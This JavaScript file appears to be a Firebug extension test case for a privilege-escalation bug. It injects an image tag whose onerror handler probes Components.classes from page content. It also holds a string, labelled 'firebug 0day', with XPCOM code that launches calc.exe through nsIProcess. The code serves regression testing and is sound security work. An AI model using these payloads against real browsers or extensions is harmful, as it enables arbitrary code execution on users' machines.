/* See license.txt for terms of usage */

(function() {

// ************************************************************************************************
// Constants

var Ci = Components.interfaces;
var Cc = Components.classes;

// ************************************************************************************************
// Initialization

var TestCase =
{
    initialize: function()
    {
        try
        {
            var innerFrame = document.getElementById("testInnerFrame");
            var frame = innerFrame.contentWindow.document.createElement("iframe");
            frame.setAttribute("type", "content-primary");
            innerFrame.appendChild(frame);

            frame.contentWindow.addEventListener("load", function()
            {
                frame.contentWindow.document.body.innerHTML =
                    "<img src=2 onerror='alert(Components.classes)'></img>";
                sysout("inner frame loaded");
            }, false);

            sysout("test case initialized");
        }
        catch (e)
        {
           sysout("EXCEPTION " + e);
        }
    },

    shutdown: function()
    {
    },
};

// ************************************************************************************************
// Logging

var expression =
    "var file = Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);" +
    "file.initWithPath('c:\\WINDOWS\\system32\\calc.exe');" +
    "var process = Components.classes['@mozilla.org/process/util;1'].createInstance(Components.interfaces.nsIProcess);" +
    "process.init(file);var args = ['-c', 'gcalctool'];process.run(false, null, 0);";

var html =
    "<html>" +
    "   <head>firebug 0day</head>" +
    "   <body>" +
    "   <img src=2 onerror='alert(Components.classes)'></img>" +
    "   </body>" +
    "</html>";

// ************************************************************************************************
// Logging

var FBTrace;
function sysout(msg)
{
    if (!FBTrace)
    {
        Components.utils.import("resource://firebug/firebug-trace-service.js");
        FBTrace = traceConsoleService.getTracer("extensions.firebug");
    }

    Components.utils.reportError(msg);
    dump(msg + "\n");
    FBTrace.sysout(msg);
}

// ************************************************************************************************
// Registration

window.addEventListener("load", function() { TestCase.initialize(); }, false);
window.addEventListener("unload", function() { TestCase.shutdown(); }, false);

// ************************************************************************************************
})();
